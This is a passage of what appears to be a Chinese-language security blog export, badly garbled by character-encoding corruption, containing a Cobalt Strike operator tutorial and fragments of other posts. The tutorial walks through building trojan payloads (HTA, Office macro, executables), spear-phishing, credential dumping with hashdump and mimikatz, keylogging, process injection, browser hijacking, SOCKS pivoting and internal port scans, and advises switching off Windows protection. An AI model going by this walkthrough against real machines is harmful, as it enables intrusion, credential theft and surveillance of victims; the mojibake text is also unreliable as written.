cobaltstrike.auth:ç”¨äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯è®¤è¯çš„æ–‡ä»¶ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æœ‰ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„ cobaltstrike.store:ç§˜é’¥è¯ä¹¦å­˜æ”¾æ–‡ä»¶ â€”äº›ç›®å½•ä½œç”¨å¦‚ä¸‹: data:ç”¨äºä¿å­˜å½“å‰TeamServerçš„ä¸€äº›æ•°æ® download:ç”¨äºå­˜æ”¾åœ¨ç›®æ ‡æœºå™¨ä¸‹è½½çš„æ•°æ® upload: ä¸Šä¼ æ–‡ä»¶çš„ç›®å½• logs:æ—¥å¿—æ–‡ä»¶ï¼ŒåŒ…æ‹¬Webæ—¥å¿—ã€Beaconæ—¥å¿—ã€æˆªå›¾æ—¥å¿—ã€ä¸‹è½½æ—¥å¿—ã€é”®ç›˜è®°å½•æ—¥å¿—ç­‰ third-party:ç¬¬ä¸‰æ–¹å·¥å…·ç›®å½• Cobalt Strike New Connection # æ–°å»ºè¿æ¥ï¼Œæ”¯æŒè¿æ¥å¤šä¸ªæœåŠ¡å™¨ç«¯ Preferences # è®¾ç½®Cobal Strikeç•Œé¢ã€æ§åˆ¶å°ã€ä»¥åŠè¾“å‡ºæŠ¥å‘Šæ ·å¼ã€TeamServerè¿æ¥è®°å½• Visualization # ä¸»è¦å±•ç¤ºè¾“å‡ºç»“æœçš„è§†å›¾ VPN Interfaces # è®¾ç½®VPNæ¥å£ Listenrs # åˆ›å»ºç›‘å¬å™¨ Script Manager # è„šæœ¬ç®¡ç†ï¼Œå¯ä»¥é€šè¿‡AggressorScriptsè„šæœ¬æ¥åŠ å¼ºè‡ªèº«ï¼Œèƒ½å¤Ÿæ‰©å±•èœå•æ ï¼ŒBeaconå‘½ä»¤è¡Œï¼Œææƒè„šæœ¬ç­‰ Close # é€€å‡ºè¿æ¥ View Applications # æ˜¾ç¤ºå—å®³ä¸»æœºçš„åº”ç”¨ä¿¡æ¯ Credentials # æ˜¾ç¤ºæ‰€æœ‰ä»¥è·å–çš„å—å®³ä¸»æœºçš„å‡­è¯ï¼Œå¦‚hashdumpã€Mimikatz Downloads # æŸ¥çœ‹å·²ä¸‹è½½æ–‡ä»¶ Event Log # ä¸»æœºä¸Šçº¿è®°å½•ä»¥åŠå›¢é˜Ÿåä½œèŠå¤©è®°å½• Keystrokes # æŸ¥çœ‹é”®ç›˜è®°å½•ç»“æœ Proxy Pivots # æŸ¥çœ‹ä»£ç†æ¨¡å— Screenshots # æŸ¥çœ‹æ‰€æœ‰å±å¹•æˆªå›¾ Script Console # åŠ è½½ç¬¬ä¸‰æ–¹è„šæœ¬ä»¥å¢å¼ºåŠŸèƒ½ Targets # æ˜¾ç¤ºæ‰€æœ‰å—å®³ä¸»æœº Web Log # æ‰€æœ‰WebæœåŠ¡çš„æ—¥å¿— AttacksPackages HTML Application # ç”Ÿæˆ(executable/VBA/powershell)è¿™ä¸‰ç§åŸç†å®ç°çš„æ¶æ„HTAæœ¨é©¬æ–‡ä»¶ MS Office Macro # ç”Ÿæˆofficeå®ç—…æ¯’æ–‡ä»¶ Payload Generator # ç”Ÿæˆå„ç§è¯­è¨€ç‰ˆæœ¬çš„payload USB/CD AutoPlay # ç”Ÿæˆåˆ©ç”¨è‡ªåŠ¨æ’­æ”¾è¿è¡Œçš„æœ¨é©¬æ–‡ä»¶ Windows Dropper # æ†ç»‘å™¨èƒ½å¤Ÿå¯¹ä»»æ„çš„æ­£å¸¸æ–‡ä»¶è¿›è¡Œæ†ç»‘(å…æ€æ•ˆæœå·®) Windows Executable # ç”Ÿæˆå¯æ‰§è¡Œexeæœ¨é©¬ Windows Executable(Stageless) # ç”Ÿæˆæ— çŠ¶æ€çš„å¯æ‰§è¡Œexeæœ¨é©¬ Web Drive-by Manage # å¯¹å¼€å¯çš„webæœåŠ¡è¿›è¡Œç®¡ç† Clone Site # å…‹éš†ç½‘ç«™ï¼Œå¯ä»¥è®°å½•å—å®³è€…æäº¤çš„æ•°æ® Host File # æä¾›æ–‡ä»¶ä¸‹è½½ï¼Œå¯ä»¥é€‰æ‹©Mimeç±»å‹ Scripted Web Delivery # ä¸ºpayloadæä¾›webæœåŠ¡ä»¥ä¾¿ä¸‹è½½å’Œæ‰§è¡Œï¼Œç±»ä¼¼äºMetasploitçš„web_delivery Signed Applet Attack # ä½¿ç”¨javaè‡ªç­¾åçš„ç¨‹åºè¿›è¡Œé’“é±¼æ”»å‡»(è¯¥æ–¹æ³•å·²è¿‡æ—¶) Smart Applet Attack # è‡ªåŠ¨æ£€æµ‹javaç‰ˆæœ¬å¹¶è¿›è¡Œæ”»å‡»ï¼Œé’ˆå¯¹Java 1.6.0_45ä»¥ä¸‹ä»¥åŠJava 1.7.0_21ä»¥ä¸‹ç‰ˆæœ¬(è¯¥æ–¹æ³•å·²è¿‡æ—¶) System Profiler # ç”¨æ¥è·å–ç³»ç»Ÿä¿¡æ¯ï¼Œå¦‚ç³»ç»Ÿç‰ˆæœ¬ï¼ŒFlashç‰ˆæœ¬ï¼Œæµè§ˆå™¨ç‰ˆæœ¬ç­‰ Spear Phish # é±¼å‰é’“é±¼é‚®ä»¶ Reporting Activity Report # æ´»åŠ¨æŠ¥å‘Š Hosts Report # ä¸»æœºæŠ¥å‘Š Indicators of Compromise # IOCæŠ¥å‘Šï¼šåŒ…æ‹¬C2é…ç½®æ–‡ä»¶çš„æµé‡åˆ†æã€åŸŸåã€IPå’Œä¸Šä¼ æ–‡ä»¶çš„MD5 hashes Sessions Report # ä¼šè¯æŠ¥å‘Š Social Engineering Report # ç¤¾ä¼šå·¥ç¨‹æŠ¥å‘Šï¼šåŒ…æ‹¬é±¼å‰é’“é±¼é‚®ä»¶åŠç‚¹å‡»è®°å½• Tactics, Techniques, and Procedures # æˆ˜æœ¯æŠ€æœ¯åŠç›¸å…³ç¨‹åºæŠ¥å‘Šï¼šåŒ…æ‹¬è¡ŒåŠ¨å¯¹åº”çš„æ¯ç§æˆ˜æœ¯çš„æ£€æµ‹ç­–ç•¥å’Œç¼“è§£ç­–ç•¥ Reset Data # é‡ç½®æ•°æ® Export Data # å¯¼å‡ºæ•°æ®ï¼Œå¯¼å‡º.tsvæ–‡ä»¶æ ¼å¼ Help Homepage # å®˜æ–¹ä¸»é¡µ Support # æŠ€æœ¯æ”¯æŒ Arsenal # å¼€å‘è€… System information # ç‰ˆæœ¬ä¿¡æ¯ About # å…³äº CobaltStrikeçš„ä½¿ç”¨ä¸€ã€åˆ›å»ºç›‘å¬å™¨Listenerç‚¹å‡»Cobalt Strikeé€‰æ‹©listenersï¼Œç‚¹å‡»ä¸‹æ–¹çš„add nameï¼šä¸ºç›‘å¬å™¨åå­—ï¼Œå¯ä»»æ„ payloadï¼špayloadç±»å‹ HTTP Hosts: shellåå¼¹çš„ä¸»æœºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬kaliçš„ip HTTP Hosts(Stager): Stagerçš„é©¬è¯·æ±‚ä¸‹è½½payloadçš„åœ°å€ HTTP Port(C2): C2ç›‘å¬çš„ç«¯å£ Beaconä¸ºå†…ç½®çš„Listenerï¼Œå³åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œç›¸åº”çš„payloadï¼Œè·å–shellåˆ°CSä¸Š;å…¶ä¸­åŒ…å«DNSã€HTTPã€HTTPSã€SMBã€‚Beaconå¯ä»¥é€‰æ‹©é€šè¿‡DNSè¿˜æ˜¯HTTPåè®®å‡ºå£ç½‘ç»œï¼Œä½ ç”šè‡³å¯ä»¥åœ¨ä½¿ç”¨Beaconé€šè®¯è¿‡ç¨‹ä¸­åˆ‡æ¢HTTPå’ŒDNSã€‚å…¶æ”¯æŒå¤šä¸»æœºè¿æ¥ï¼Œéƒ¨ç½²å¥½Beaconåæäº¤ä¸€ä¸ªè¦è¿å›çš„åŸŸåæˆ–ä¸»æœºçš„åˆ—è¡¨ï¼ŒBeaconå°†é€šè¿‡è¿™äº›ä¸»æœºè½®è¯¢ã€‚ç›®æ ‡ç½‘ç»œçš„é˜²æŠ¤å›¢é˜Ÿå¿…é¡»æ‹¦æˆªæ‰€æœ‰çš„åˆ—è¡¨ä¸­çš„ä¸»æœºæ‰å¯ä¸­æ–­å’Œå…¶ç½‘ç»œçš„é€šè®¯ã€‚é€šè¿‡ç§ç§æ–¹å¼è·å–sheä»¥åï¼ˆ(æ¯”å¦‚ç›´æ¥è¿è¡Œç”Ÿæˆçš„exe)ï¼Œå°±å¯ä»¥ä½¿ç”¨Beaconäº†ã€‚Foreignä¸ºå¤–éƒ¨ç»“åˆçš„Listenerï¼Œå¸¸ç”¨äºMSFçš„ç»“åˆï¼Œä¾‹å¦‚è·å–meterpreteråˆ°MSFä¸Šã€‚ äºŒã€åˆ›å»ºæ”»å‡»Attacksè¿™é‡ŒAttacksæœ‰å‡ ç§ï¼Œå¦‚ä¸‹ï¼š Â· HTML Application ç”Ÿæˆä¸€ä¸ªæ¶æ„HTML Applicationæœ¨é©¬ï¼Œåç¼€æ ¼å¼ä¸º .htaã€‚é€šè¿‡HTMLè°ƒç”¨å…¶ä»–è¯­ è¨€çš„åº”ç”¨ç»„ä»¶è¿›è¡Œæ”»å‡»ï¼Œæä¾›äº† å¯æ‰§è¡Œæ–‡ä»¶ã€PowerShellã€VBAä¸‰ç§æ–¹æ³•ã€‚ Â· MS Office Macro ç”Ÿæˆofficeå®ç—…æ¯’æ–‡ä»¶ï¼› Â· Payload Generator ç”Ÿæˆå„ç§è¯­è¨€ç‰ˆæœ¬çš„payloadï¼Œå¯ä»¥ç”ŸæˆåŸºäºCã€C#ã€COM Scriptletã€Javaã€Perlã€ PowerShellã€Pythonã€Rubyã€VBAç­‰çš„payload Â· Windows Executable ç”Ÿæˆ32ä½æˆ–64ä½çš„exeå’ŒåŸºäºæœåŠ¡çš„exeã€DLLç­‰åé—¨ç¨‹åº Â· Windows Executable(S) ç”¨äºç”Ÿæˆä¸€ä¸ªexeå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«Beaconçš„å®Œæ•´payloadï¼Œä¸éœ€è¦é˜¶æ®µæ€§çš„è¯·æ±‚ã€‚ä¸Windows Executableæ¨¡å—ç›¸æ¯”ï¼Œè¯¥æ¨¡å—é¢å¤–æä¾›äº†ä»£ç†è®¾ç½®ï¼Œä»¥ä¾¿åœ¨è¾ƒä¸ºè‹›åˆ»çš„ç¯å¢ƒä¸­è¿›è¡Œæ¸—é€æµ‹è¯•ã€‚è¯¥æ¨¡å—è¿˜æ”¯æŒpowershellè„šæœ¬ï¼Œå¯ç”¨äºå°†Stageless Payloadæ³¨å…¥å†…å­˜ Windows Executable åŒå‡»ç”Ÿæˆçš„ç¨‹åºï¼Œè®°å¾—æŠŠwindowsè‡ªå¸¦çš„ä¿æŠ¤å…³æ‰ å¯¹è¢«æ§ä¸»æœºçš„æ“ä½œInteract æ‰“å¼€beacon Access dump hashes è·å–hash Elevate ææƒ Golden Ticket ç”Ÿæˆé»„é‡‘ç¥¨æ®æ³¨å…¥å½“å‰ä¼šè¯ MAke token å‡­è¯è½¬æ¢ Run Mimikatz è¿è¡Œ Mimikatz Spawn As ç”¨å…¶ä»–ç”¨æˆ·ç”ŸæˆCobalt Strikeçš„beacon Explore Browser Pivot åŠ«æŒç›®æ ‡æµè§ˆå™¨è¿›ç¨‹ Desktop(VNC) æ¡Œé¢äº¤äº’ File Browser æ–‡ä»¶æµè§ˆå™¨ Net View å‘½ä»¤Net View Port scan ç«¯å£æ‰«æ Process list è¿›ç¨‹åˆ—è¡¨ Screenshot æˆªå›¾ Pivoting SOCKS Server ä»£ç†æœåŠ¡ Listener åå‘ç«¯å£è½¬å‘ Deploy VPN éƒ¨ç½²VPN Spawn æ–°çš„é€šè®¯æ¨¡å¼å¹¶ç”Ÿæˆä¼šè¯ Session ä¼šè¯ç®¡ç†ï¼Œåˆ é™¤ï¼Œå¿ƒè·³æ—¶é—´ï¼Œé€€å‡ºï¼Œå¤‡æ³¨ ä¸€ã€å‘½ä»¤è¯´æ˜beaconå¤„è¾“å…¥helpï¼š Beacon Commands =============== Command Description ------- ----------- argue è¿›ç¨‹å‚æ•°æ¬ºéª— blockdlls åœ¨å­è¿›ç¨‹ä¸­é˜»æ­¢éMicrosoftçš„DLLsæ–‡ä»¶ browserpivot æ³¨å…¥å—å®³è€…æµè§ˆå™¨è¿›ç¨‹ bypassuac ç»•è¿‡UAC cancel å–æ¶ˆæ­£åœ¨è¿›è¡Œçš„ä¸‹è½½ cd åˆ‡æ¢ç›®å½• checkin å¼ºåˆ¶è®©è¢«æ§ç«¯å›è¿ä¸€æ¬¡ clear æ¸…é™¤beaconå†…éƒ¨çš„ä»»åŠ¡é˜Ÿåˆ— connect é€šè¿‡TCPè¿æ¥åˆ°Beacon covertvpn éƒ¨ç½²Covert VPNå®¢æˆ·ç«¯ cp å¤åˆ¶æ–‡ä»¶ dcsync ä»DCä¸­æå–å¯†ç å“ˆå¸Œ desktop è¿œç¨‹VNC dllinject åå°„DLLæ³¨å…¥è¿›ç¨‹ dllload ä½¿ç”¨LoadLibraryå°†DLLåŠ è½½åˆ°è¿›ç¨‹ä¸­ download ä¸‹è½½æ–‡ä»¶ downloads åˆ—å‡ºæ­£åœ¨è¿›è¡Œçš„æ–‡ä»¶ä¸‹è½½ drives åˆ—å‡ºç›®æ ‡ç›˜ç¬¦ elevate å°è¯•ææƒ execute åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(æ— è¾“å‡º) execute-assembly åœ¨ç›®æ ‡ä¸Šå†…å­˜ä¸­æ‰§è¡Œæœ¬åœ°.NETç¨‹åº exit é€€å‡ºbeacon getprivs å¯¹å½“å‰ä»¤ç‰Œå¯ç”¨ç³»ç»Ÿæƒé™ getsystem å°è¯•è·å–SYSTEMæƒé™ getuid è·å–ç”¨æˆ·ID hashdump è½¬å‚¨å¯†ç å“ˆå¸Œå€¼ help å¸®åŠ© inject åœ¨ç‰¹å®šè¿›ç¨‹ä¸­ç”Ÿæˆä¼šè¯ jobkill æ€æ­»ä¸€ä¸ªåå°ä»»åŠ¡ jobs åˆ—å‡ºåå°ä»»åŠ¡ kerberos_ccache_use ä»ccacheæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯ kerberos_ticket_purge æ¸…é™¤å½“å‰ä¼šè¯çš„ç¥¨æ® kerberos_ticket_use ä»ticketæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯ keylogger é”®ç›˜è®°å½• kill ç»“æŸè¿›ç¨‹ link é€šè¿‡å‘½åç®¡é“è¿æ¥åˆ°Beacon logonpasswords ä½¿ç”¨mimikatzè½¬å‚¨å‡­æ®å’Œå“ˆå¸Œå€¼ ls åˆ—å‡ºæ–‡ä»¶ make_token åˆ›å»ºä»¤ç‰Œä»¥ä¼ é€’å‡­æ® mimikatz è¿è¡Œmimikatz mkdir åˆ›å»ºä¸€ä¸ªç›®å½• mode dns ä½¿ç”¨DNS Aä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon) mode dns-txt ä½¿ç”¨DNS TXTä½œä¸ºé€šä¿¡é€šé“(ä»…é™D beacon) mode dns6 ä½¿ç”¨DNS AAAAä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon) mode http ä½¿ç”¨HTTPä½œä¸ºé€šä¿¡é€šé“ mv ç§»åŠ¨æ–‡ä»¶ net netå‘½ä»¤ note ç»™å½“å‰ç›®æ ‡æœºå™¨å¤‡æ³¨ portscan è¿›è¡Œç«¯å£æ‰«æ powerpick é€šè¿‡Unmanaged PowerShellæ‰§è¡Œå‘½ä»¤ powershell é€šè¿‡powershell.exeæ‰§è¡Œå‘½ä»¤ powershell-import å¯¼å…¥powershellè„šæœ¬ ppid ä¸ºç”Ÿæˆçš„post-exä»»åŠ¡è®¾ç½®çˆ¶PID ps æ˜¾ç¤ºè¿›ç¨‹åˆ—è¡¨ psexec ä½¿ç”¨æœåŠ¡åœ¨ä¸»æœºä¸Šç”Ÿæˆä¼šè¯ psexec_psh ä½¿ç”¨PowerShellåœ¨ä¸»æœºä¸Šç”Ÿæˆä¼šè¯ psinject åœ¨ç‰¹å®šè¿›ç¨‹ä¸­æ‰§è¡ŒPowerShellå‘½ä»¤ pth ä½¿ç”¨Mimikatzè¿›è¡Œä¼ é€’å“ˆå¸Œ pwd å½“å‰ç›®å½•ä½ç½® reg æŸ¥è¯¢æ³¨å†Œè¡¨ rev2self æ¢å¤åŸå§‹ä»¤ç‰Œ rm åˆ é™¤æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ rportfwd ç«¯å£è½¬å‘ run åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(è¿”å›è¾“å‡º) runas ä»¥å¦ä¸€ä¸ªç”¨æˆ·æƒé™æ‰§è¡Œç¨‹åº runasadmin åœ¨é«˜æƒé™ä¸‹æ‰§è¡Œç¨‹åº runu åœ¨å¦ä¸€ä¸ªPIDä¸‹æ‰§è¡Œç¨‹åº screenshot å±å¹•æˆªå›¾ setenv è®¾ç½®ç¯å¢ƒå˜é‡ shell cmdæ‰§è¡Œå‘½ä»¤ shinject å°†shellcodeæ³¨å…¥è¿›ç¨‹ shspawn ç”Ÿæˆè¿›ç¨‹å¹¶å°†shellcodeæ³¨å…¥å…¶ä¸­ sleep è®¾ç½®ç¡çœ å»¶è¿Ÿæ—¶é—´ socks å¯åŠ¨SOCKS4ä»£ç† socks stop åœæ­¢SOCKS4 spawn ç”Ÿæˆä¸€ä¸ªä¼šè¯ spawnas ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½ç”Ÿæˆä¼šè¯ spawnto å°†å¯æ‰§è¡Œç¨‹åºæ³¨å…¥è¿›ç¨‹ spawnu åœ¨å¦ä¸€ä¸ªPIDä¸‹ç”Ÿæˆä¼šè¯ ssh ä½¿ç”¨sshè¿æ¥è¿œç¨‹ä¸»æœº ssh-key ä½¿ç”¨å¯†é’¥è¿æ¥è¿œç¨‹ä¸»æœº steal_token ä»è¿›ç¨‹ä¸­çªƒå–ä»¤ç‰Œ timestomp å°†ä¸€ä¸ªæ–‡ä»¶æ—¶é—´æˆ³åº”ç”¨åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ unlink æ–­å¼€ä¸Beaconçš„è¿æ¥ upload ä¸Šä¼ æ–‡ä»¶ wdigest ä½¿ç”¨mimikatzè½¬å‚¨æ˜æ–‡å‡­æ® winrm ä½¿ç”¨WinRMåœ¨ä¸»æœºä¸Šç”Ÿæˆä¼šè¯ wmi ä½¿ç”¨WMIåœ¨ä¸»æœºä¸Šç”Ÿæˆä¼šè¯ äºŒã€ææƒå³é”®-&gt;Access-&gt;Elevate æˆ‘è¿™é‡Œå› ä¸ºæ˜¯win10ï¼Œè‡ªå¸¦çš„ä¸¤ä¸ªpayloadéƒ½ä¸èƒ½æˆåŠŸææƒã€‚ è‹¥ææƒæˆåŠŸï¼Œä¼šè¿”å›æ¥ä¸€ä¸ªç®¡ç†å‘˜çš„shellã€‚å½“ç„¶æˆ‘è¿™é‡Œè¿˜æ˜¯è¿”å›äº†ä¸€ä¸ªæ™®é€šæƒé™ï¼š ä¸‰ã€æŠ“å–hashå’Œdumpæ˜æ–‡å¯†ç  å³é”®-&gt;Access-&gt;DumpHashesåˆ©ç”¨mimikatzæŠ“å–æ˜æ–‡å¯†ç ï¼šå³é”®-&gt;Access-&gt;Run Mimikatz æŠ“å–å¯†ç å“ˆå¸Œï¼Œä¹Ÿå¯ä»¥ç›´æ¥è¾“å…¥hashdumpä½¿ç”¨mimikatzæŠ“å–æ˜æ–‡å¯†ç ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è¾“å…¥logonpasswords æŠ“å–å®Œä¹‹åç‚¹å‡»å‡­è¯ä¿¡æ¯ï¼Œå°±ä¼šæ˜¾ç¤ºæˆ‘ä»¬æŠ“å–è¿‡çš„å“ˆå¸Œæˆ–æ˜æ–‡ã€‚ç”±äºæˆ‘æ²¡æœ‰ç®¡ç†å‘˜æƒé™ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰å°è¯•ã€‚ å››ã€åˆ©ç”¨è¢«æ§ä¸»æœºå»ºç«‹Socks4ä»£ç† å½“æˆ‘ä»¬æ§åˆ¶çš„ä¸»æœºæ˜¯ä¸€å°ä½äºå…¬ç½‘å’Œå†…ç½‘è¾¹ç•Œçš„æœåŠ¡å™¨ï¼Œæˆ‘ä»¬æƒ³åˆ©ç”¨è¯¥ä¸»æœºç»§ç»­å¯¹å†…ç½‘è¿›è¡Œæ¸—é€ï¼Œäºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨CSå»ºç«‹socks4Aä»£ç† ç„¶åvim /etc/proxychains.conf ï¼Œåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ socks4ä»£ç†æœåŠ¡å™¨ socks4 æœåŠ¡ç«¯ip 9071ä½¿ç”¨proxychainsä»£ç†æ‰«æå†…ç½‘ä¸»æœºproxychains nmap -sP x.x.x.x/24 æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡éš§é“å°†æ•´ä¸ªmsfå¸¦è¿›ç›®æ ‡å†…ç½‘ç‚¹å‡»View-&gt;Proxy Pivotsï¼Œé€‰æ‹©Socks4a Proxy,ç‚¹å‡»Tunnel: æ‰“å¼€msfå¯¹å†…ç½‘è¿›è¡Œæ‰«æ å…³é—­socksbeacon&gt;socks stop äº”ã€æ³¨å…¥è¿›ç¨‹ã€é”®ç›˜ç›‘æ§å³é”®è¢«æ§ä¸»æœº-&gt;Explore-&gt;Process List å³å¯åˆ—å‡ºè¿›ç¨‹åˆ—è¡¨ killä¸ºæ€æ­»è¯¥è¿›ç¨‹ï¼Œrefreshä¸ºåˆ·æ–°è¯¥è¿›ç¨‹ï¼Œinjectåˆ™æ˜¯æŠŠbeaconæ³¨å…¥è¿›ç¨‹ï¼Œlog keystrokesä¸ºé”®ç›˜è®°å½•ï¼Œscreenshotä¸ºæˆªå›¾ï¼Œstea tokenä¸ºçªƒå–è¿è¡ŒæŒ‡å®šç¨‹åºçš„ç”¨æˆ·ä»¤ç‰Œ 1ã€Injectæ³¨å…¥è¿›ç¨‹é€‰æ‹©è¿›ç¨‹ï¼Œç‚¹å‡»Injectï¼Œéšåé€‰æ‹©ç›‘å¬å™¨ï¼Œç‚¹å‡»chooseï¼Œå³å¯å‘ç°CobaltStrikeå¼¹å›äº†ç›®æ ‡æœºçš„ä¸€ä¸ªæ–°ä¼šè¯ï¼Œè¿™ä¸ªä¼šè¯å°±æ˜¯æˆåŠŸæ³¨å…¥åˆ°æŸè¿›ç¨‹çš„beaconä¼šè¯ã€‚è¯¥åŠŸèƒ½å¯ä»¥æŠŠä½ çš„beaconä¼šè¯æ³¨å…¥åˆ°å¦å¤–â€”ä¸ªç¨‹åºä¹‹ä¸­ï¼Œæ³¨å…¥ä¹‹åï¼Œé™¤éé‚£ä¸ªæ­£å¸¸è¿›ç¨‹è¢«æ€æ­»äº†ï¼Œå¦åˆ™æˆ‘ä»¬å°±ä¸€ç›´å¯ä»¥æ§åˆ¶è¯¥ä¸»æœºäº†ã€‚ inject è¿›ç¨‹PID è¿›ç¨‹ä½æ•° ç›‘å¬ å•å‡»ä¸€ä¸ªè¿›ç¨‹ï¼Œå•å‡»injectï¼Œé€‰æ‹©ç›‘å¬å™¨ï¼Œå°±ä¼šå¼¹å›æ¥beaconã€‚ 2ã€é”®ç›˜è®°å½•ä»»æ„é€‰æ‹©ä¸€ä¸ªè¿›ç¨‹ï¼Œç‚¹å‡»log keystrokesï¼Œå³å¯ç›‘å¬è¯¥ä¸»æœºçš„é”®ç›˜è®°å½• keylogger è¿›ç¨‹PID è¿›ç¨‹ä½æ•° (ç¡¬æ ¸æ‰“ç .jpg æŸ¥çœ‹é”®ç›˜è®°å½•ç»“æœéœ€è¦ç‚¹å‡»ä¸Šé¢é‚£ä¸ªé’¥åŒ™æŒ‰é’®ã€‚æ³¨æ„è¿™é‡Œæ˜¯ç›‘å¬æ‰€æœ‰çš„é”®ç›˜è®°å½•ï¼Œè€Œä¸åªæ˜¯é€‰ä¸­è¿›ç¨‹çš„é”®ç›˜è®°å½•ã€‚ å…­ã€æµè§ˆå™¨ä»£ç†Browser Pivotä½¿ç”¨æµè§ˆå™¨ä»£ç†åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥æ³¨å…¥åˆ°ç›®æ ‡æœºå™¨çš„æµè§ˆå™¨è¿›ç¨‹ä¸­ã€‚ç„¶ååœ¨æœ¬åœ°æµè§ˆå™¨ä¸­è®¾ç½®è¯¥ä»£ç†ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°æµè§ˆå™¨ä¸Šè®¿é—®ç›®æ ‡æœºå™¨æµè§ˆå™¨å·²ç»ç™»å½•çš„ç½‘ç«™ï¼Œè€Œä¸éœ€è¦ç™»å½•ã€‚ä½†æ˜¯ç›®å‰æµè§ˆå™¨ä»£ç†åªæ”¯æŒIEæµè§ˆå™¨ã€‚å¦‚ä¸‹ï¼Œç›®æ ‡ä¸»æœºçš„IEæµè§ˆå™¨ç›®å‰åœ¨è®¿é—®fofaï¼Œå¹¶ä¸”å·²ç™»å½•ã€‚ç°åœ¨æˆ‘ä»¬æƒ³åˆ©ç”¨æµè§ˆå™¨ä»£ç†åœ¨æœ¬åœ°åˆ©ç”¨ç›®æ ‡ä¸»æœºèº«ä»½è¿›è¡Œè®¿é—®ã€‚ explore-&gt;Browser Pivotéšä¾¿é€‰ä¸€ä¸ªè¿›ç¨‹ï¼Œç‚¹å‡»å¼€å§‹ã€‚ ç„¶åè§†å›¾ä»£ç†ä¿¡æ¯å¯ä»¥çœ‹åˆ°åˆšåˆšå»ºç«‹çš„æµè§ˆå™¨ä»£ç†ã€‚è¿™é‡Œçš„æ„æ€æ˜¯ï¼ŒTeamServerç›‘å¬59398å’Œ26193ç«¯å£ã€‚æµç¨‹æ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬å°†æµé‡ç»™59398ç«¯å£ï¼Œ59398ç«¯å£å°†æµé‡ç»™26193ç«¯å£ï¼Œ26193å°†æµæ˜Ÿç»™ç›®æ ‡ä¸»æœºçš„26193ç«¯å£ã€‚ è¿™é‡Œæ‡’å¾—è¯•äº†ï¼Œæ”¾ä¸ªå›¾ã€‚ ä¸ƒã€ç”Ÿæˆé»„é‡‘ç¥¨æ®æ³¨å…¥å½“å‰ä¼šè¯ï¼ˆGolden Ticketï¼‰æš‚ç•¥ã€‚ å…«ã€å‡­è¯è½¬æ¢æš‚ç•¥ã€‚ ä¹ã€ç«¯å£æ‰«æ portscan 192.168.10.1-192.168.10.10 22,445 arp 1024 portscan 192.168.10.1-192.168.10.10 22,445 icmp 1024 portscan 192.168.10.1-192.168.10.10 22,445 none 1024 ä¸€èˆ¬æˆ‘ä»¬ç›´æ¥è¿è¡Œå‘½ä»¤ portscan 192.168.1.0/24 22,445,1433,3306 åã€å“ˆå¸Œä¼ é€’æ”»å‡»æˆ–SSHè¿œç¨‹ç™»å½•æš‚ç•¥ã€‚ åä¸€ã€è¿˜æœ‰å¾ˆå¤šï¼Œæš‚æ—¶ä¸å†™äº† å°ç»“è¿˜æ²¡å†™å®Œï¼Œæœ‰ç©ºç»§ç»­å­¦ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"Java Webå­¦ä¹ ","slug":"Java-Webå®‰å…¨","date":"2021-05-13T06:16:30.000Z","updated":"2021-05-23T15:24:54.562Z","comments":true,"path":"2021/05/13/Java-Webå®‰å…¨/","link":"","permalink":"/2021/05/13/Java-Webå®‰å…¨/","excerpt":"","text":"é‡å†™ä¸­","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"Laravelæ¼æ´åˆ†æ","slug":"Laravelæ¼æ´åˆ†æ","date":"2021-05-10T04:14:05.000Z","updated":"2021-05-13T04:35:21.982Z","comments":true,"path":"2021/05/10/Laravelæ¼æ´åˆ†æ/","link":"","permalink":"/2021/05/10/Laravelæ¼æ´åˆ†æ/","excerpt":"","text":"åˆç»™è‡ªå·±æŒ–äº†ä¸ªå¤§å‘ã€‚ã€‚ã€‚ é€šè¿‡phpStudyæ­å»ºLaravelä»githubä¸ŠæŠŠæºç downä¸‹æ¥ï¼šhttps://github.com/laravel/laravel/releases?after=v5.8.35ç„¶ååœ¨æ ¹ç›®å½•æ‰“å¼€cmdï¼šcomposer intsall ç”Ÿæˆvenderç›®å½•æ”¹hosts è·¯å¾„ï¼šC:\\Windows\\System32\\drivers\\etc\\hostsæ·»åŠ 127.0.0.1 www.fuck.com(Laravelå¿…é¡»ç”±åŸŸåè®¿é—®æœ€åæŠŠæ ¹ç›®å½•ä¸‹.env.exampleä¸­çš„å†…å®¹å¤åˆ¶åˆ°.envä¸­ï¼ˆè®°å¾—localhostæ”¹æˆwww.fuck.comï¼‰ï¼Œcmdä¸­æ‰§è¡Œphp artisan 